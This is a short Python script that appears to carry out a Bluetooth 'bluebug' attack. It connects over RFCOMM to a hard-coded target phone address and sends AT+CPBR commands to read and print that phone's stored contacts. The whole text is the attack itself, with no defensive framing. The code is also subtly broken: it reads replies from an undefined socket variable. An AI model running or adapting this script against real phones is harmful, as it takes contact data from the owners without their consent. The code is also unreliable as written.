import bluetooth
tgtPhone = "AC:07:5F:6B:1F:11"
port = 8
phoneSock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
phoneSock.connect((tgtPhone, port))
for contact in range(1,5):
    atCmd = "AT+CPBR=" + str(contact) + '\n'
    phoneSock.send(atCmd)
    result = client_sock.recv(1024)
    print("[+] " + str(contact) + ": " + result)
phoneSock.close()